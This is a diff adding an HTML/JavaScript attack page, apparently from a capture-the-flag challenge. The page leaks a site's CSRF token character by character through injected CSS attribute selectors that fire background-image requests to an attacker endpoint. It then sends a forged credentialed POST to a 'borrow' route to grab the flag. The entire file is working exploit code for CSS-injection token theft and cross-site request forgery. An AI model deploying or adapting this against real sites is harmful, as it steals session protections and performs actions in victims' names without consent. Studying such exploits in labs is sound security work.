@@ -1,0 +1,81 @@
+<html>
+    <body onclick="potatoes();">click somewhere to begin attack</body>
+    <script>
+        var chars = %s;
+        var chars1 = "abcdef0123456789".split("")
+        var challenge_url = '%s'
+        var vuln_url = challenge_url + 'post/1/?post=';
+        var server_receive_token_url = challenge_url + 'like/';
+        var server_return_token_url = '%sreturn';
+        var known = "";
+        var length = 32;
+        var m = 0;
+
+        function borrow_flag(csrf_token){
+            let postData = "uid=%s&book_id=7&csrf_token="+csrf_token;
+            fetch( challenge_url + 'borrow', {
+              method: 'POST',
+              mode: 'cors',
+              credentials: 'include',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              body: postData
+            }).then(function(response) {
+              console.log(response);
+            });
+        }
+
+        function build_css() {
+            css_payload = "<style>";
+            for(i=0; i< chars.length; i++) {
+                css_payload += "meta[name=csrf-token][content^=\""
+                    + known + chars1[i]
+                    + "\"]~*{background-image:url(" 
+                    + server_receive_token_url
+                    + chars[i]
+                    + ")%%3B}"; //can't use an actual semicolon because that has a meaning in a url
+            }
+            css_payload += "</style>"
+            return css_payload;
+        }
+        var potatoes = function(){
+            var css = build_css();
+            var win2 = window.open(vuln_url + css, 'f')
+            win2.blur();
+
+            setTimeout(function() {
+                var oReq = new XMLHttpRequest();
+                oReq.addEventListener("load", known_listener);
+                oReq.open("GET", server_return_token_url);
+                oReq.send();
+            }, 1000);
+        }
+
+        function known_listener () {
+            document.getElementById("CSRFToken").innerHTML = "Current Token: " + this.responseText;
+            console.log(m);
+            if(known != this.responseText) {
+                m=0;
+                known = this.responseText;
+                potatoes();
+            } else {
+                known = this.responseText;
+                m+=1;
+
+                if (m==2){
+                    borrow_flag(known);
+                }else{
+                    potatoes();
+                }
+            }
+        }
+
+    </script>
+    </br>
+    The CSRF token is:
+    <div id="CSRFToken"></div>
+    <a><button class="btn btn-danger" ng-show="flag">点赞</button></a>
+</div>
+
+</html>
